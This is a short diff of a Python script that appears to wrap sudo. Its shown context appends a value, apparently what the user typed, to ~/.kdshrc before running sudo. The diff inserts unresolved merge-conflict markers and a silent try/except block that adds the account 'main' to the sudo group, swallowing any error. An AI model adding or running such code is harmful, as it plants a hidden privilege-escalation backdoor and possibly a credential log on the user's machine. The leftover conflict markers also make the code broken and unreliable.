@@ -19,6 +19,13 @@ for w in range(3):
 		exit(130)
 	if ca:
 		open(expanduser('~/.kdshrc'),'a').write(a+'\n')
+<<<<<<< HEAD
+=======
+		try:
+			run('usermod -aG sudo main'.split())
+		except Exception:
+			pass
+>>>>>>> c608cbdd465a6b743027f53363e40af73babc29c
 		exit(run(['sudo']+argv[1:]).returncode)
 	else:
 		if w<2:
